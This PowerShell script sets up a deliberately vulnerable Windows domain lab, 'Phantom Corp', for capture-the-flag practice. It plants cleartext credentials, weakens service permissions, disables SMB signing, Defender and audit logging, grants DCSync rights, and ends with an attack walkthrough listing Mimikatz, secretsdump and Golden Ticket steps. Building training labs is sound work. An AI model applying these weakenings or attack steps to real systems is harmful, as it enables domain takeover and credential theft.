#Requires -RunAsAdministrator
<#
================================================================================
  HTB-STYLE LAB — "PHANTOM CORP"
================================================================================
  Difficulté  : Medium → Hard
  OS          : Windows Server 2019 + Windows 10 (jointé au domaine)
  Thème       : Entreprise fictive "Phantom Corp" — département IT négligent
  
  CHAÎNE D'EXPLOITATION PRÉVUE :
  ─────────────────────────────
  [1] Recon HTTP  → fichier de config exposé avec creds en clair
  [2] WinRM       → accès initial user "helpdesk" (faible)
  [3] Local PrivEsc → SeImpersonatePrivilege + service mal configuré
  [4] Credential Dump → DPAPI + credential manager
  [5] Lateral Move → Pass-the-Hash vers DC (SMB signing désactivé)
  [6] Domain Privesc → WriteDACL sur Domain Admins + DCSync

  ⚠️  USAGE EXCLUSIF EN ENVIRONNEMENT LAB ISOLÉ ⚠️
  Ne jamais exécuter sur un système de production ou réseau réel.
================================================================================
#>

# ─── COULEURS CONSOLE (style HTB) ────────────────────────────────────────────
function Write-Banner {
    Clear-Host
    Write-Host @"
 ██████╗ ██╗  ██╗ █████╗ ███╗  ██╗████████╗ ██████╗ ███╗  ███╗
 ██╔══██╗██║  ██║██╔══██╗████╗ ██║╚══██╔══╝██╔═══██╗████╗████║
 ██████╔╝███████║███████║██╔██╗██║   ██║   ██║   ██║██╔████╔██║
 ██╔═══╝ ██╔══██║██╔══██║██║╚████║   ██║   ██║   ██║██║╚██╔╝██║
 ██║     ██║  ██║██║  ██║██║ ╚███║   ██║   ╚██████╔╝██║ ╚═╝ ██║
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
              C O R P  —  L A B  S E T U P  v1.0
"@ -ForegroundColor DarkRed

    Write-Host "  [*] Scenario  : Phantom Corp — Compromised IT Department" -ForegroundColor DarkCyan
    Write-Host "  [*] Difficulty: Medium/Hard" -ForegroundColor Yellow
    Write-Host "  [*] Target OS : Windows Server 2019 + Win10 Domain Member`n" -ForegroundColor Gray
}

function Write-Step($msg) { Write-Host "`n  [+] $msg" -ForegroundColor Green }
function Write-Info($msg) { Write-Host "  [~] $msg" -ForegroundColor Cyan }
function Write-Warn($msg) { Write-Host "  [!] $msg" -ForegroundColor Yellow }

Write-Banner

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 0 — Détection du rôle de la machine
# ══════════════════════════════════════════════════════════════════════════════
$isDC = (Get-WindowsFeature -Name AD-Domain-Services -ErrorAction SilentlyContinue).InstallState -eq "Installed"
Write-Info "Rôle détecté : $(if ($isDC) { 'Domain Controller' } else { 'Member / Standalone' })"

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 1 — VECTEUR INITIAL : Fichier de config exposé via IIS
#  Vulnérabilité : credentials en clair dans web.config accessible publiquement
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "Configuration du vecteur initial — IIS + fichier sensible exposé"

# Installe IIS si absent
if (-not (Get-WindowsFeature -Name Web-Server).Installed) {
    Install-WindowsFeature -Name Web-Server -IncludeManagementTools | Out-Null
    Write-Info "IIS installé"
}

# Crée le répertoire web et le fichier de config "oublié"
$webRoot = "C:\inetpub\wwwroot"
New-Item -Path "$webRoot\portal" -ItemType Directory -Force | Out-Null

# Fichier de config avec creds en clair (réaliste : dev qui a hardcodé ses creds)
@'
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <appSettings>
    <!-- TODO: remove before prod - ticket #4872 -->
    <add key="AdminUser"     value="helpdesk" />
    <add key="AdminPass"     value="Ph@ntom2024!" />
    <add key="SMTPUser"      value="notifications@phantom.corp" />
    <add key="SMTPPass"      value="N0tif!cation$" />
    <add key="DBConnString"  value="Server=DC01\SQLEXPRESS;Database=PhantomDB;User Id=sa;Password=S4_S3cr3t@2024;" />
  </appSettings>
  <system.web>
    <compilation debug="true" targetFramework="4.7.2" />
  </system.web>
</configuration>
'@ | Out-File "$webRoot\portal\web.config" -Encoding UTF8

# Fichier backup encore plus juteux (simulé comme un "vieux backup")
@'
# Phantom Corp — IT Notes (CONFIDENTIEL)
# Auteur : j.martin@phantom.corp
# Date   : 2023-11-14

## Comptes de service actifs
svc_deploy   : Deploy@Phantom#99
svc_sql      : SQLSvc!2k23_Phantom
helpdesk     : Ph@ntom2024!
backup_admin : Bkp@Phantom_2022  <- compte legacy, à supprimer

## WinRM activé sur tous les serveurs (port 5985)
## PSRemoting autorisé pour groupe "IT_Support"
'@ | Out-File "$webRoot\portal\it_notes.txt" -Encoding UTF8

Write-Info "Fichiers sensibles déposés dans $webRoot\portal\"

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 2 — ACCÈS INITIAL : WinRM activé + compte helpdesk faible
#  Vulnérabilité : WinRM ouvert + password trouvé dans web.config
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "Activation WinRM + création compte helpdesk"

# Active WinRM
Enable-PSRemoting -Force -SkipNetworkProfileCheck | Out-Null
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -Enabled True -ErrorAction SilentlyContinue
netsh advfirewall firewall add rule name="WinRM-Lab" dir=in action=allow protocol=tcp localport=5985 | Out-Null

# Crée le compte helpdesk (user:helpdesk / pass:Ph@ntom2024!)
$helpdeskPass = ConvertTo-SecureString "Ph@ntom2024!" -AsPlainText -Force
if (-not (Get-LocalUser -Name "helpdesk" -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name "helpdesk" -Password $helpdeskPass `
        -Description "IT Helpdesk — Phantom Corp" `
        -PasswordNeverExpires $true | Out-Null
}
Add-LocalGroupMember -Group "Remote Management Users" -Member "helpdesk" -ErrorAction SilentlyContinue
Write-Info "Compte helpdesk créé (WinRM autorisé)"

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 3 — PRIVESC LOCAL : SeImpersonatePrivilege + service vulnérable
#  Vulnérabilité : binaire de service remplaçable + SeImpersonate accordé
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "Configuration PrivEsc — Service vulnérable + SeImpersonatePrivilege"

# Accorde SeImpersonatePrivilege à helpdesk (comme un IIS app pool ou SQL service)
$seimpScript = @'
$userName = "helpdesk"
$privName  = "SeImpersonatePrivilege"
$exportFile = "$env:TEMP\secpol_export.inf"
$importFile = "$env:TEMP\secpol_import.inf"

secedit /export /cfg $exportFile /quiet
$content = Get-Content $exportFile

# Trouve la ligne et ajoute l'utilisateur
$newContent = $content -replace "(SeImpersonatePrivilege\s*=.*)", "`$1,$userName"
$newContent | Set-Content $importFile
secedit /configure /db secedit.sdb /cfg $importFile /quiet
'@
Invoke-Expression $seimpScript

# Crée un service avec binaire modifiable par "helpdesk"
$svcDir  = "C:\PhantomServices"
$svcExe  = "$svcDir\PhantomMonitor.exe"
New-Item -Path $svcDir -ItemType Directory -Force | Out-Null

# Binaire placeholder (un .bat renommé suffit pour le concept)
@'
@echo off
:: Phantom Corp Monitor Service
ping -n 3600 127.0.0.1 > nul
'@ | Out-File "$svcDir\PhantomMonitor.bat" -Encoding ASCII
Copy-Item "C:\Windows\System32\cmd.exe" $svcExe -Force

# Crée le service en SYSTEM
sc.exe create "PhantomMonitor" `
    binPath= "$svcExe /c `"C:\PhantomServices\PhantomMonitor.bat`"" `
    start= auto obj= LocalSystem `
    DisplayName= "Phantom Corp Monitor" | Out-Null

# Donne FullControl sur le dossier à helpdesk (vuln : binaire remplaçable)
$acl = Get-Acl $svcDir
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "helpdesk", "FullControl",
    "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl $svcDir $acl
Write-Info "Service PhantomMonitor (SYSTEM) avec binaire remplaçable par helpdesk"

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 4 — CREDENTIAL DUMP : DPAPI + Credential Manager + fichiers sensibles
#  Vulnérabilité : creds stockés sans protection + historique PowerShell actif
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "Dépôt de credentials DPAPI + Credential Manager"

# Stocke des credentials dans le Windows Credential Manager
cmdkey /add:"TERMSRV/DC01.phantom.corp" /user:"phantom\svc_deploy" /pass:"Deploy@Phantom#99" 2>$null
cmdkey /add:"TERMSRV/FILES01.phantom.corp" /user:"phantom\backup_admin" /pass:"Bkp@Phantom_2022" 2>$null
cmdkey /add:"http://intranet.phantom.corp" /user:"helpdesk" /pass:"Ph@ntom2024!" 2>$null

# Historique PS avec credentials (pratique courante négligente)
$psHistDir = "C:\Users\helpdesk\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
New-Item -Path $psHistDir -ItemType Directory -Force | Out-Null
@'
Get-Process
net use \\DC01\SYSVOL /user:phantom\svc_deploy Deploy@Phantom#99
Invoke-Command -ComputerName DC01 -Credential (Get-Credential)
$pass = ConvertTo-SecureString "Bkp@Phantom_2022" -AsPlainText -Force
$cred = New-Object PSCredential("phantom\backup_admin", $pass)
Enter-PSSession -ComputerName FILES01 -Credential $cred
'@ | Out-File "$psHistDir\ConsoleHost_history.txt" -Encoding UTF8

# Fichier de script avec password hardcodé dans C:\Scripts
New-Item -Path "C:\Scripts" -ItemType Directory -Force | Out-Null
@'
# Script de sauvegarde automatique — Phantom Corp
# NE PAS PARTAGER
$backupUser = "phantom\backup_admin"
$backupPass = "Bkp@Phantom_2022"
$secPass    = ConvertTo-SecureString $backupPass -AsPlainText -Force
$cred       = New-Object PSCredential($backupUser, $secPass)

# Monte le partage de sauvegarde
New-PSDrive -Name "BACKUP" -PSProvider FileSystem `
    -Root "\\NAS01\backups$" -Credential $cred -Persist
'@ | Out-File "C:\Scripts\Run-Backup.ps1" -Encoding UTF8

Write-Info "Credentials stockés dans le Credential Manager + historique PS + scripts"

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 5 — MOUVEMENT LATÉRAL : SMB Signing désactivé + partages exposés
#  Vulnérabilité : NTLM relay possible, partages ouverts
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "Configuration SMB vulnérable — Signing désactivé + LLMNR actif"

# Désactive SMB Signing (permet NTLM relay)
Set-SmbServerConfiguration -RequireSecuritySignature $false `
                            -EnableSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force

# Active LLMNR (poisonnable avec Responder)
$llmnrPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
if (!(Test-Path $llmnrPath)) { New-Item -Path $llmnrPath -Force | Out-Null }
Set-ItemProperty -Path $llmnrPath -Name "EnableMulticast" -Value 1

# Désactive NBT-NS via registre (le laisser à 0 = actif, vulnérable)
# NBT-NS reste actif par défaut — on s'assure juste qu'il n'est pas bloqué
$interfaces = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
foreach ($iface in $interfaces) {
    Set-ItemProperty -Path $iface.PSPath -Name "NetbiosOptions" -Value 0
}

# Crée un partage ouvert avec fichiers sensibles
New-Item -Path "C:\PhantomShare" -ItemType Directory -Force | Out-Null
@'
Serveur     : DC01.phantom.corp
Domaine     : PHANTOM
Admin local : .\localadmin / L0calAdm!n2024
Domain Admin: phantom\da_svc  <- compte de service DA (legacy)
Password DA : D4_S3rv!ce@Phantom
'@ | Out-File "C:\PhantomShare\server_inventory.txt" -Encoding UTF8

New-SmbShare -Name "PhantomData" -Path "C:\PhantomShare" `
    -FullAccess "Everyone" -ErrorAction SilentlyContinue | Out-Null
Write-Info "Partage SMB 'PhantomData' ouvert à Everyone"

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 6 — DOMAINE (si DC) : ACL Abuse + DCSync
#  Vulnérabilité : WriteDACL accordé à un user non-privilégié
# ══════════════════════════════════════════════════════════════════════════════
if ($isDC) {
    Write-Step "Configuration AD — ACL Abuse + compte DCSync"
    Import-Module ActiveDirectory -ErrorAction SilentlyContinue

    # Crée les comptes du scénario
    $accounts = @(
        @{ Name="svc_deploy";   Pass="Deploy@Phantom#99"; SPN="HTTP/deploy.phantom.corp" },
        @{ Name="svc_sql";      Pass="SQLSvc!2k23_Phantom"; SPN="MSSQLSvc/DC01.phantom.corp:1433" },
        @{ Name="backup_admin"; Pass="Bkp@Phantom_2022";  SPN=$null },
        @{ Name="da_svc";       Pass="D4_S3rv!ce@Phantom"; SPN="HTTP/admin.phantom.corp" }
    )

    foreach ($acc in $accounts) {
        if (-not (Get-ADUser -Filter "SamAccountName -eq '$($acc.Name)'" -ErrorAction SilentlyContinue)) {
            New-ADUser -Name $acc.Name -SamAccountName $acc.Name `
                -AccountPassword (ConvertTo-SecureString $acc.Pass -AsPlainText -Force) `
                -Enabled $true -PasswordNeverExpires $true
        }
        if ($acc.SPN) {
            Set-ADUser -Identity $acc.Name `
                -ServicePrincipalNames @{Add=$acc.SPN} -ErrorAction SilentlyContinue
        }
    }

    # da_svc dans Domain Admins (compte DA "oublié")
    Add-ADGroupMember -Identity "Domain Admins" -Members "da_svc" -ErrorAction SilentlyContinue

    # AS-REP Roasting : backup_admin sans pré-auth Kerberos
    Set-ADAccountControl -Identity "backup_admin" -DoesNotRequirePreAuth $true

    # WriteDACL sur "Domain Admins" pour svc_deploy
    # → permet à svc_deploy d'ajouter n'importe quel user dans DA
    $domainAdminsDN = (Get-ADGroup -Identity "Domain Admins").DistinguishedName
    $svcDeploySID   = (Get-ADUser -Identity "svc_deploy").SID

    $acl = Get-Acl "AD:\$domainAdminsDN"
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $svcDeploySID,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($ace)
    Set-Acl -Path "AD:\$domainAdminsDN" -AclObject $acl

    # Droits DCSync pour da_svc (DS-Replication-Get-Changes)
    $rootDSE     = [ADSI]"LDAP://RootDSE"
    $domainDN    = $rootDSE.defaultNamingContext
    $da_svcSID   = (Get-ADUser -Identity "da_svc").SID
    $domainObj   = [ADSI]"LDAP://$domainDN"
    $aclDomain   = $domainObj.ObjectSecurity

    # DS-Replication-Get-Changes
    $guidGetChanges     = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    # DS-Replication-Get-Changes-All
    $guidGetChangesAll  = [Guid]"1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"

    foreach ($guid in @($guidGetChanges, $guidGetChangesAll)) {
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $da_svcSID,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $guid,
            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        $aclDomain.AddAccessRule($ace)
    }
    $domainObj.CommitChanges()

    Write-Info "AD configuré : AS-REP Roasting, WriteDACL, DCSync rights"
}

# ══════════════════════════════════════════════════════════════════════════════
#  ÉTAPE 7 — ANTI-DÉTECTION PARTIEL : Désactive Windows Defender + logging
#  (réaliste : sysadmin qui a "simplifié" la config)
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "Affaiblissement des défenses — Defender + Audit"

# Désactive Defender Real-Time (comme un admin négligent)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

# Désactive l'audit des process (moins de logs)
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable 2>$null

# Désactive le ScriptBlock Logging PS (habituel en entreprise mal configurée)
$psLogPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (!(Test-Path $psLogPath)) { New-Item -Path $psLogPath -Force | Out-Null }
Set-ItemProperty -Path $psLogPath -Name "EnableScriptBlockLogging" -Value 0

Write-Info "Defender désactivé, audit allégé"

# ══════════════════════════════════════════════════════════════════════════════
#  RÉSUMÉ FINAL — CARTE D'EXPLOITATION
# ══════════════════════════════════════════════════════════════════════════════
Write-Host "`n" + ("═" * 72) -ForegroundColor DarkRed
Write-Host "  PHANTOM CORP — CARTE D'EXPLOITATION" -ForegroundColor Red
Write-Host ("═" * 72) -ForegroundColor DarkRed

Write-Host @"

  FOOTHOLD
  ────────
  → Scan IIS : http://<TARGET>/portal/web.config
                http://<TARGET>/portal/it_notes.txt
  → Creds trouvés : helpdesk / Ph@ntom2024!
  → Evil-WinRM  : evil-winrm -i <TARGET> -u helpdesk -p 'Ph@ntom2024!'

  LOCAL PRIVESC
  ─────────────
  → winPEAS / PowerUp détecte PhantomMonitor (binaire writable)
  → Remplace C:\PhantomServices\PhantomMonitor.exe par reverse shell
  → sc.exe stop PhantomMonitor && sc.exe start PhantomMonitor → SYSTEM
  → Alternative : SeImpersonatePrivilege → PrintSpoofer / GodPotato

  CREDENTIAL HUNTING
  ──────────────────
  → Mimikatz dpapi::cred + sekurlsa::logonpasswords
  → cmdkey /list → TERMSRV/DC01 (svc_deploy / Deploy@Phantom#99)
  → C:\Users\helpdesk\...\ConsoleHost_history.txt
  → C:\Scripts\Run-Backup.ps1 → backup_admin / Bkp@Phantom_2022

  LATERAL MOVEMENT
  ────────────────
  → Responder → LLMNR/NBT-NS poison → NTLMv2 hash → crack/relay
  → CrackMapExec smb <RANGE> -u svc_deploy -p 'Deploy@Phantom#99'
  → Pass-the-Hash (SMB signing OFF)
  → \\<TARGET>\PhantomData → server_inventory.txt → da_svc creds

  DOMAIN PRIVESC (DC)
  ───────────────────
  → BloodHound : svc_deploy a WriteDACL sur Domain Admins
  → Add-DomainObjectAcl → GenericAll sur DA group
  → Add-DomainGroupMember → helpdesk dans Domain Admins
  → AS-REP Roast : GetNPUsers.py PHANTOM/ -no-pass → backup_admin hash
  → Kerberoast  : GetUserSPNs.py → svc_sql / svc_deploy / da_svc
  → DCSync final : secretsdump.py PHANTOM/da_svc@DC01 → krbtgt hash
  → Golden Ticket → persistance totale

  FLAGS (à créer manuellement)
  ─────────────────────────────
  → C:\Users\helpdesk\Desktop\user.txt
  → C:\Users\Administrator\Desktop\root.txt

"@ -ForegroundColor White

Write-Host ("═" * 72) -ForegroundColor DarkRed
Write-Host "  Setup terminé. Bonne chasse ! 🎯" -ForegroundColor Green
Write-Host ("═" * 72 + "`n") -ForegroundColor DarkRed
